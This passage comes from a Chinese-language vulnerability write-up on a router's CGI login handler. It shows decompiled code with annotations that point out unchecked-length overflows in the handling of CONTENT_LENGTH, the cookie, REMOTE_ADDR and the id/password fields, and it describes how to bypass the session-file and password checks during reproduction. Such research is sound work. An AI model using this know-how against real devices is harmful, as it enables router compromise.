getenv(&quot;REMOTE_ADDR&quot;);</span><br><span class="line">    if ( sub_40A424((int)v68) &lt; 0 )</span><br><span class="line">      goto LABEL_16;</span><br><span class="line">    v6 = sub_40A82C(&amp;v62, v69, v4);</span><br><span class="line">    if ( v6 &lt; 0 )</span><br><span class="line">      goto LABEL_16;</span><br><span class="line">    if ( v63 &lt; 0 )</span><br><span class="line">      goto LABEL_16;</span><br><span class="line">    v7 = v62;</span><br><span class="line">    sysinfo(&amp;v55);</span><br><span class="line">    if ( v7 &lt; v55.uptime )</span><br><span class="line">      goto LABEL_16;</span><br><span class="line">    if ( strcmp(v5, v64) )</span><br><span class="line">      goto LABEL_16;</span><br><span class="line">    sysinfo(&amp;v55);</span><br><span class="line">    v62 = v55.uptime + 600;</span><br><span class="line">    sub_40A69C(&amp;v62, v6, 1, v4);</span><br><span class="line">    if ( v63 &lt; 0 )</span><br><span class="line">      goto LABEL_16;</span><br><span class="line">    if ( sub_40A424((int)v68) &lt; 0 )</span><br><span class="line">      goto LABEL_16;</span><br><span class="line">    v8 = sub_40A82C(&amp;v62, v69, v4);</span><br><span class="line">    if ( v8 &lt; 0 )</span><br><span class="line">      goto LABEL_16;</span><br><span class="line">    if ( v4 == 1 )</span><br><span class="line">      sprintf(v65, &quot;%s/%d&quot;, &quot;/var/session&quot;, v8);</span><br><span class="line">    else</span><br><span class="line">      sprintf(v65, &quot;%s/webfa%d&quot;, &quot;/var/session&quot;, v8);</span><br><span class="line">    if ( unlink(v65) &gt;= 0 )</span><br><span class="line">      v9 = 10;</span><br><span class="line">    else</span><br><span class="line">LABEL_16:</span><br><span class="line">      v9 = 11;</span><br><span class="line">    goto LABEL_96;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !strcmp(request_method, &quot;GET&quot;) )         // if GET</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = time(0);</span><br><span class="line">    v11 = v58;</span><br><span class="line">    srand(v10);</span><br><span class="line">    do                                          // produce random string</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = rand() % 0x3E;</span><br><span class="line">      v13 = v12 + &#x27;0&#x27;;</span><br><span class="line">      if ( v12 &gt;= 0xA &amp;&amp; (v13 = v12 + 0x37, v12 - 10 &gt;= 0x1A) )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v12 - 0x24 &gt;= 0x1A )</span><br><span class="line">          *(_BYTE *)v11 = &#x27;0&#x27;;</span><br><span class="line">        else</span><br><span class="line">          *(_BYTE *)v11 = v12 + 0x3D;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)v11 = v13;</span><br><span class="line">      &#125;</span><br><span class="line">      v11 = (int *)((char *)v11 + 1);</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v11 != (int *)((char *)&amp;v58[2] + 2) );</span><br><span class="line">    BYTE2(v58[2]) = 0;</span><br><span class="line">    v14 = open(&quot;/proc/sys/kernel/random/uuid&quot;, 0, v12 - 10 &lt; 0x1A);</span><br><span class="line">    v15 = read(v14, &amp;v58[16], 0x40u);</span><br><span class="line">    if ( v15 &gt;= 37 )</span><br><span class="line">      v15 = 36;</span><br><span class="line">    *((_BYTE *)&amp;v58[16] + v15) = 0;</span><br><span class="line">    close(v14);</span><br><span class="line">    sysinfo(&amp;v55);</span><br><span class="line">    v58[32] = v55.uptime + 600;</span><br><span class="line">    v16 = 1;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      if ( sub_40A960(v59, v16, 0) &lt; 0 )</span><br><span class="line">        goto LABEL_32;</span><br><span class="line">      v17 = v60;</span><br><span class="line">      sysinfo(&amp;v55);</span><br><span class="line">      ++v16;</span><br><span class="line">      if ( v17 &lt; v55.uptime )</span><br><span class="line">      &#123;</span><br><span class="line">        --v16;</span><br><span class="line">LABEL_32:</span><br><span class="line">        sysinfo(&amp;v55);</span><br><span class="line">        v58[32] = v55.uptime + 600;</span><br><span class="line">        sub_40A960(v58, v16, 1);</span><br><span class="line">        v9 = 0;</span><br><span class="line">        goto LABEL_96;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v16 != 129 );</span><br><span class="line">    v9 = 1;</span><br><span class="line">    goto LABEL_96;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( strcmp(request_method, &quot;POST&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_95:</span><br><span class="line">    v9 = 4;</span><br><span class="line">    goto LABEL_96;</span><br><span class="line">  &#125;</span><br><span class="line">  memset(v67, 0, sizeof(v67));</span><br><span class="line">  v19 = getenv(&quot;CONTENT_TYPE&quot;);</span><br><span class="line">  v18 = getenv(&quot;CONTENT_LENGTH&quot;);</span><br><span class="line">  if ( !v19</span><br><span class="line">    || !v18</span><br><span class="line">    || (v20 = atoi(v18), v21 = fileno(stdin), read(v21, v71, v20) &lt; 0)// input 也会出现溢出，只要控制length&gt;1024</span><br><span class="line">    || (v71[v20] = 0, sub_40A424((int)v67) &lt; 0) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_51:</span><br><span class="line">    v9 = 5;</span><br><span class="line">    goto LABEL_96;</span><br><span class="line">  &#125;</span><br><span class="line">  haystack = v71;</span><br><span class="line">  dest = (char *)v67;</span><br><span class="line">  v22 = (const char **)off_43308C;</span><br><span class="line">  for ( i = 0; i != 2; ++i )                    // id=&amp;password=</span><br><span class="line">  &#123;</span><br><span class="line">    v24 = *v22;</span><br><span class="line">    v25 = strstr(haystack, *v22);</span><br><span class="line">    v26 = &amp;v25[strlen(v24)];                    // v25+len(v24)</span><br><span class="line">    v27 = v26;</span><br><span class="line">    while ( 1 )                                 // 读取id=之后&amp;之前的内容</span><br><span class="line">    &#123;</span><br><span class="line">      v28 = *v27;</span><br><span class="line">      if ( v28 == &#x27;&amp;&#x27; )</span><br><span class="line">        break;</span><br><span class="line">      ++v27;</span><br><span class="line">      if ( !v28 )</span><br><span class="line">      &#123;</span><br><span class="line">        --v27;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v29 = v27 - v26;                            // id的大小</span><br><span class="line">    if ( i )                                    // 如果是password</span><br><span class="line">    &#123;</span><br><span class="line">      if ( i != 1 )</span><br><span class="line">        goto LABEL_51;</span><br><span class="line">      strncpy((char *)&amp;v67[32], v26, v27 - v26);// v67+0x80 没控制password大小</span><br><span class="line">      *((_BYTE *)&amp;v67[32] + v29) = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else                                        // 如果是id</span><br><span class="line">    &#123;</span><br><span class="line">      strncpy(dest, v26, v27 - v26);</span><br><span class="line">      *((_BYTE *)v67 + v29) = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v22;</span><br><span class="line">  &#125;</span><br><span class="line">  memset(v58, 0, sizeof(v58));</span><br><span class="line">  if ( sub_40AACC(v58, &amp;v67[64]) &lt; 0 )          // 检查cookie，因此cookie必须存在</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = 6;</span><br><span class="line">    goto LABEL_96;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v4 != 2 )</span><br><span class="line">      goto LABEL_85;</span><br><span class="line">    if ( !fopen(&quot;/var/run/storage_account_root&quot;, &quot;r&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = 12;</span><br><span class="line">      goto LABEL_96;</span><br><span class="line">    &#125;</span><br><span class="line">    memset(v66, 0, sizeof(v66));</span><br><span class="line">    v66[1] = (int)v67;</span><br><span class="line">    if ( check_id_password(v66, v56) &gt;= 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      sprintf(v70, &quot;%s%s&quot;, (const char *)v67, (const char *)&amp;v58[16]);</span><br><span class="line">      v42 = (struct sysinfo *)v54;</span><br><span class="line">      v44 = strlen(v70);</span><br><span class="line">      v43 = strlen(v56);</span><br><span class="line">      v52 = v54;</span><br><span class="line">      ((void (__fastcall *)(char *, size_t, char *, size_t))hmac_md5)(v70, v44, v56, v43);</span><br><span class="line">      v45 = 0;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v46 = sprintf(&amp;v57[v45], &quot;%02x&quot;, LOBYTE(v42-&gt;uptime));</span><br><span class="line">        v42 = (struct sysinfo *)((char *)v42 + 1);</span><br><span class="line">        v45 += v46;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v42 != &amp;v55 );</span><br><span class="line">      if ( !strcmp(v57, (const char *)&amp;v67[32]) )</span><br><span class="line">      &#123;</span><br><span class="line">        v67[96] = 0;</span><br><span class="line">        goto LABEL_85;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_84:</span><br><span class="line">    v9 = 3;</span><br><span class="line">    goto LABEL_96;</span><br><span class="line">  &#125;</span><br><span class="line">  memset(v66, 0, sizeof(v66));</span><br><span class="line">  v66[1] = (int)v67;</span><br><span class="line">  v66[0] = -1;</span><br><span class="line">  v53 = 0;</span><br><span class="line">  v30 = sobj_new();</span><br><span class="line">  v31 = sobj_new();</span><br><span class="line">  v32 = sobj_new();</span><br><span class="line">  v33 = xs_fopen(&quot;/var/passwd&quot;, &quot;r&quot;);</span><br><span class="line">  if ( v33 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !v30 )</span><br><span class="line">      goto LABEL_65;</span><br><span class="line">    if ( v31 &amp;&amp; v32 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        sobj_xstream_eatwhite(v33);</span><br><span class="line">        if ( sobj_xstream_read(v33, v30, 0, &amp;v53) &lt;= 0 )</span><br><span class="line">          break;</span><br><span class="line">        sobj_xstream_eatwhite(v33);</span><br><span class="line">        if ( sobj_xstream_read(v33, v31, 0, &amp;v53) &lt;= 0 )</span><br><span class="line">          break;</span><br><span class="line">        sobj_xstream_eatwhite(v33);</span><br><span class="line">        if ( sobj_xstream_read(v33, v32, 0, &amp;v53) &lt;= 0 )</span><br><span class="line">          break;</span><br><span class="line">        v34 = (const char *)v66[1];             // id</span><br><span class="line">        string = sobj_get_string((int)v30);</span><br><span class="line">        if ( !strcmp(v34, string) )</span><br><span class="line">        &#123;</span><br><span class="line">          v66[2] = sobj_strdup(v31);</span><br><span class="line">          v36 = sobj_get_string((int)v32);</span><br><span class="line">          v66[0] = atoi(v36);</span><br><span class="line">          break;</span><br><span class="line">        &#125;</span><br><span class="line">        sobj_free(v30);</span><br><span class="line">        sobj_free(v31);</span><br><span class="line">        sobj_free(v32);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !v30 )</span><br><span class="line">  &#123;</span><br><span class="line">    goto LABEL_65;</span><br><span class="line">  &#125;</span><br><span class="line">  sobj_del(v30);</span><br><span class="line">LABEL_65:</span><br><span class="line">  if ( v31 )</span><br><span class="line">    sobj_del(v31);</span><br><span class="line">  if ( v32 )</span><br><span class="line">    sobj_del(v32);</span><br><span class="line">  if ( v33 )</span><br><span class="line">    xs_close(v33);</span><br><span class="line">  if ( v66[0] &lt; 0 )</span><br><span class="line">    goto LABEL_84;</span><br><span class="line">  sprintf(v70, &quot;%s%s&quot;, (const char *)v67, (const char *)&amp;v58[16]);</span><br><span class="line">  v37 = (struct sysinfo *)v54;</span><br><span class="line">  v39 = strlen(v70);</span><br><span class="line">  v38 = strlen((const char *)v66[2]);</span><br><span class="line">  v52 = v54;</span><br><span class="line">  ((void (__fastcall *)(char *, size_t, int, size_t))hmac_md5)(v70, v39, v66[2], v38);</span><br><span class="line">  v40 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v41 = sprintf(&amp;v56[v40], &quot;%02X&quot;, LOBYTE(v37-&gt;uptime));</span><br><span class="line">    v37 = (struct sysinfo *)((char *)v37 + 1);</span><br><span class="line">    v40 += v41;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v37 != &amp;v55 );</span><br><span class="line">  if ( strcmp(v56, (const char *)&amp;v67[32]) )</span><br><span class="line">    goto LABEL_84;</span><br><span class="line">  v67[96] = v66[0];</span><br><span class="line">LABEL_85:</span><br><span class="line">  memset(v66, 0, sizeof(v66));</span><br><span class="line">  v66[1] = (int)v67;</span><br><span class="line">  if ( check_id_password(v66, v57) &gt;= 0         // v66[3]=storage_id;v57=storage_passwd</span><br><span class="line">    &amp;&amp; (strcpy((char *)v67, (const char *)&amp;v66[3]), v47 = getenv(&quot;REMOTE_ADDR&quot;), (v48 = v47) != 0)// remote_addr 必须存在</span><br><span class="line">    &amp;&amp; (v49 = 1, *v47) )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(v61, 0, sizeof(v61));</span><br><span class="line">    while ( sub_40A69C(v61, v49, 0, v4) &gt;= 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v50 = v61[0];</span><br><span class="line">      sysinfo(&amp;v55);</span><br><span class="line">      ++v49;</span><br><span class="line">      if ( v50 &lt; v55.uptime )</span><br><span class="line">      &#123;</span><br><span class="line">        --v49;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v49 == 129 )</span><br><span class="line">        goto LABEL_100;</span><br><span class="line">    &#125;</span><br><span class="line">    memset(v61, 0, sizeof(v61));</span><br><span class="line">    strncpy((char *)&amp;v61[2], (const char *)&amp;v67[64], 0x40u);</span><br><span class="line">    strncpy((char *)&amp;v61[22], (const char *)v67, 0x80u);</span><br><span class="line">    strncpy((char *)&amp;v61[18], v48, 0x10u);</span><br><span class="line">    sysinfo(&amp;v55);</span><br><span class="line">    v61[0] = v55.uptime + 600;</span><br><span class="line">    v61[1] = v67[96];</span><br><span class="line">    sub_40A69C(v61, v49, 1, v4);</span><br><span class="line">    sub_40ABE4(&amp;v61[2]);</span><br><span class="line">    v9 = 2;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_100:</span><br><span class="line">    v9 = 8;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_96:</span><br><span class="line">  error_print((char *)v67, (int)v58, v9);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码很长我们一步一步分析</p>
+<p>首先确定输入的参数是否满足下面四个字符串，返回值赋值给v4</p>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/30/05bf133339057.png" alt="image-20230430093835922"></p>
+<p>已知输入不是logout，因此跳过</p>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/30/30b55c36f94cc.png" alt="image-20230430093718398"></p>
+<p>判断是GET请求还是POST请求，已知漏洞存在于POST请求，跳过</p>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/30/62884cd803b87.png" alt="image-20230430094127604"></p>
+<p>获得类型和长度，<strong>这里长度并没有做检查，stdin是输入流，因此，只要我们将CONTENT_LENGTH值构造的非常大，即可造成溢出</strong>，紧接着进入<code>sub_40a424</code>函数</p>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/30/7a1d757c687c2.png" alt="image-20230430094257985"></p>
+<p>这个函数类似于上一边分析的<code>sess_get_uid</code>函数，<strong>当参数HTTP_COOKIE不存在时，会获取参数REMOTE_ADDR，同样REMOTE_ADDR的长度也没有限制，因此，当调用strcpy赋值时，会发生溢出</strong>，但后续操作会对cookie进行检查，若没有cookie，程序报错，因此，该溢出无法利用。<strong>当参数HTTP_COOKIE存在时，格式为uid=，=号后是我们可控的数据，没有对长度进行检查，因此也会发生溢出</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_40A424(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; // $s2</span><br><span class="line">  char *v2; // $v0</span><br><span class="line">  _DWORD *v3; // $s3</span><br><span class="line">  char *v4; // $s4</span><br><span class="line">  int v5; // $s1</span><br><span class="line">  int v6; // $s0</span><br><span class="line">  char *string; // $v0</span><br><span class="line"></span><br><span class="line">  v1 = sobj_new();</span><br><span class="line">  v3 = sobj_new();</span><br><span class="line">  v2 = getenv(&quot;HTTP_COOKIE&quot;);</span><br><span class="line">  if ( !v1 || !v3 || (v4 = v2) == 0 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_21:</span><br><span class="line">    string = getenv(&quot;REMOTE_ADDR&quot;);</span><br><span class="line">    goto LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *v4;</span><br><span class="line">    if ( !*v4 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v5 == 1 )</span><br><span class="line">      goto LABEL_11;</span><br><span class="line">    if ( v5 &lt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v6 == &#x27; &#x27; )                          // 空格跳过</span><br><span class="line">        goto LABEL_18;</span><br><span class="line">      sobj_free(v1);</span><br><span class="line">      sobj_free(v3);</span><br><span class="line">LABEL_11:</span><br><span class="line">      if ( v6 == &#x27;;&#x27; )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = 0;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = 2;</span><br><span class="line">        if ( v6 != &#x27;=&#x27; )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(v1, v6);</span><br><span class="line">          v5 = 1;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      goto LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v5 == 2 )                              // 不是‘ ’、‘；’、‘=’</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v6 == &#x27;;&#x27; )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = 3;</span><br><span class="line">        goto LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(v3, *v4++);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = 0;</span><br><span class="line">      if ( !sobj_strcmp(v1, &quot;uid&quot;) )</span><br><span class="line">        goto LABEL_30;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( sobj_strcmp(v1, &quot;uid&quot;) )</span><br><span class="line">    goto LABEL_21;</span><br><span class="line">LABEL_30:</span><br><span class="line">  string = sobj_get_string((int)v3);</span><br><span class="line">LABEL_22:</span><br><span class="line">  strcpy((char *)(a1 + 0x100), string);         // 没有cookie remote_addr 溢出，但后续有cookie检查因此无法利用</span><br><span class="line">                                                // 有cookie，则存为cookie</span><br><span class="line">  if ( v1 )</span><br><span class="line">    sobj_del(v1);</span><br><span class="line">  if ( v3 )</span><br><span class="line">    sobj_del(v3);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对输入格式进行检查，必须为<code>id=&amp;password</code>这样的格式，<strong>同样，在调用strncpy()时，没有对v27-v26的大小进行检查，id=后的输入会被复制到dest中，dest是栈上的指针，而password=后的输入会被直接复制到栈上，也会造成溢出</strong></p>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/30/768ad19ecc328.png" alt="image-20230430095754275"></p>
+<p>分析到这，在《揭秘家用路由器0day漏洞挖掘技术》一书中，并没有给出后续代码的分析了，直接利用之前read()处的溢出漏洞直接构造ROP，但在我漏洞复现的时候并不能这么舒服的构造pyload，因为后续还有非常多的代码对我们的输入进行了检查，上网搜的复现博客也并没有提到后续的检查代码，我甚至怀疑是因为我下载的固件打了补丁吗？但如果打了补丁为什么read()函数处的漏洞依然存在。难道是因为真实机器环境不一样吗？但后续检查代码会打开<code>/var/session、/var/run/storage_account_root</code>等文件进行检查，即使真机中存在这些文件，但其内容肯定不像书中构造的payload那样简单，如果有书中肯定也会提及。因此，在查阅了大量信息依旧无果后，决定硬刚。</p>
+<p>先回忆下重要参数：v71是我们的输入、v67[0]<del>v67[31]是id,v67[32]</del>v67[63]是password,v67[64]~v67[95]是cookie</p>
+<p>我们先看第一个检查，进入<code>sub_40AACC</code>函数</p>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/30/f2c6f720c8a23.png" alt="image-20230430102054581"></p>
+<p>发现这里有个strcmp()参数为a1，a2，已知a2是我们的输入cookie，因此只需要确定a1即可，a1被复制给v5，因此进入<code>sub_40A960</code>函数</p>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/30/3c0617b0fbaf9.png" alt="image-20230430103016071"></p>
+<p><code>sub_40A960</code>函数代码如下，其中打开了<code>/var/session/c-num</code>文件,并读取0x84个字节作为cookie，由于cookie是随机生成的因此，我们创建文件<code>/var/session/c1</code>,并在文件中写入0x84个‘a’，即可绕过该检查。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_40A960(void *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v5; // $v0</span><br><span class="line">  int v6; // $s1</span><br><span class="line">  int v7; // $s0</span><br><span class="line">  int v8; // $v0</span><br><span class="line">  char v10[64]; // [sp+18h] [-40h] BYREF</span><br><span class="line"></span><br><span class="line">  sprintf(v10, &quot;%s/c%d&quot;, &quot;/var/session&quot;, a2);#打开文件</span><br><span class="line">  if ( a3 )#a3为0，跳过</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = open(v10, 770, 511);</span><br><span class="line">      v6 = v8;</span><br><span class="line">      if ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = -1;</span><br><span class="line">        if ( lockf(v8, 1, 0) )</span><br><span class="line">          goto LABEL_12;</span><br><span class="line">        v7 = 0;</span><br><span class="line">        if ( write(v6, a1, 0x84u) )</span><br><span class="line">          goto LABEL_12;</span><br><span class="line">        goto LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = open(v10, 2);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  if ( !v5 )</span><br><span class="line">    return -1;</span><br><span class="line">  v7 = -1;</span><br><span class="line">  if ( lockf(v5, 1, 0) )</span><br><span class="line">    goto LABEL_12;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  if ( read(v6, a1, 0x84u) == 0x84 )#必须从文件中读入0x84个字节</span><br><span class="line">    goto LABEL_12;</span><br><span class="line">LABEL_11:</span><br><span class="line">  v7 = -1;</span><br><span class="line">LABEL_12:</span><br><span class="line">  close(v6);</span><br><span class="line">  return v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们接着看一下第二个检查，代码如下,打开了<code>/var/passwd</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> memset(v66, 0, sizeof(v66));</span><br><span class="line">  v66[1] = (int)v67;</span><br><span class="line">  v66[0] = -1;</span><br><span class="line">  v53 = 0;</span><br><span class="line">  v30 = sobj_new();</span><br><span class="line">  v31 = sobj_new();</span><br><span class="line">  v32 = sobj_new();</span><br><span class="line">  v33 = xs_fopen(&quot;/var/passwd&quot;, &quot;r&quot;);</span><br><span class="line">  if ( v33 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !v30 )</span><br><span class="line">      goto LABEL_65;</span><br><span class="line">    if ( v31 &amp;&amp; v32 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        sobj_xstream_eatwhite(v33);</span><br><span class="line">        if ( sobj_xstream_read(v33, v30, 0, &amp;v53) &lt;= 0 )</span><br><span class="line">          break;</span><br><span class="line">        sobj_xstream_eatwhite(v33);</span><br><span class="line">        if ( sobj_xstream_read(v33, v31, 0, &amp;v53) &lt;= 0 )</span><br><span class="line">          break;</span><br><span class="line">        sobj_xstream_eatwhite(v33);</span><br><span class="line">        if ( sobj_xstream_read(v33, v32, 0, &amp;v53) &lt;= 0 )</span><br><span class="line">          break;</span><br><span class="line">        v34 = (const char *)v66[1];             // id</span><br><span class="line">        string = sobj_get_string((int)v30);</span><br><span class="line">        if ( !strcmp(v34, string) )</span><br><span class="line">        &#123;</span><br><span class="line">          v66[2] = sobj_strdup(v31);</span><br><span class="line">          v36 = sobj_get_string((int)v32);</span><br><span class="line">          v66[0] = atoi(v36);</span><br><span class="line">          break;</span><br><span class="line">        &#125;</span><br><span class="line">        sobj_free(v30);</span><br><span class="line">        sobj_free(v31);</span><br><span class="line">        sobj_free(v32);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !v30 )</span><br><span class="line">  &#123;</span><br><span class="line">    goto LABEL_65;</span><br><span class="line">  &#125;</span><br><span class="line">  sobj_del(v30);</span><br><span class="line">LABEL_65:</span><br><span class="line">  if ( v31 )</span><br><span class="line">    sobj_del(v31);</span><br><span class="line">  if ( v32 )</span><br><span class="line">    sobj_del(v32);</span><br><span class="line">  if ( v33 )</span><br><span class="line">    xs_close(v33);</span><br><span class="line">  if ( v66[0] &lt; 0 )</span><br><span class="line">    goto LABEL_84;</span><br></pre></td></tr></table></figure>
+
